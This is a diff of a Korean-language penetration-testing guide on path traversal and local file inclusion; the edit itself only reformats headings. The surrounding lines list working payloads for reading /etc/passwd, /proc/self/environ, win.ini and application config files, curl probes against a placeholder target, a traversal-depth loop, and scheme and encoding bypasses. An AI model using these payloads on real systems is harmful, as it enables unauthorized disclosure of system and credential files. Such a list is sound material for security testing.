@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Linux 시스템 파일 (읽기 전용, 무해):**
+#### Linux 시스템 파일 (읽기 전용, 무해)
 - `../../../../etc/passwd` (query)
 - `../../../etc/hostname`
 - `/etc/passwd` (절대 경로 직접)
@@ -9,7 +9,7 @@
 - `../../../../etc/issue`
 - `../../../../proc/version`
 
-**Windows 시스템 파일:**
+#### Windows 시스템 파일
 - `..\\..\\..\\windows\\win.ini`
 - `C:\\Windows\\win.ini`
 - `..\\..\\..\\boot.ini`
@@ -23,7 +23,7 @@
 - `../../../../proc/self/status`
 - `../../../../proc/self/fd/0`
 
-**애플리케이션 파일:**
+#### 애플리케이션 파일
 - `../package.json`
 - `../next.config.js`
 - `../config.yml`, `../application.yml`
@@ -58,7 +58,7 @@ curl "https://target/api/plugin?name=/proc/self/environ"
 curl "https://target/api/module?name=os"  # 임의 모듈 import
 ```
 
-**OOB/에러 기반 확인:**
+#### OOB/에러 기반 확인
 ```bash
 # 존재하는 파일 vs 존재하지 않는 파일 응답 diff
 curl -w "%{http_code} %{size_download}\n" "https://target/api/files?name=../../../etc/passwd"
@@ -68,7 +68,7 @@ curl -w "%{http_code} %{size_download}\n" "https://target/api/files?name=../../.
 curl "https://target/api/fetch?url=file:///etc/passwd"
 ```
 
-**체계적 시도 (다양한 깊이):**
+#### 체계적 시도 (다양한 깊이)
 ```bash
 for d in 1 2 3 4 5 6 7 8 9 10; do
   prefix=$(printf '../%.0s' $(seq 1 $d))
@@ -93,7 +93,7 @@ done
 | 블랙리스트 스킴 (`file:`) | `php://filter/resource=/etc/passwd`, `gopher://`, `dict://`, `jar://`, `expect://` |
 | 화이트리스트 prefix | `/safe/../../../etc/passwd`, `/safe/.@evil` |
 
-**다양한 인코딩 변형:**
+#### 다양한 인코딩 변형
 ```
 ../etc/passwd                       (raw)
 %2e%2e%2fetc%2fpasswd               (URL encode)
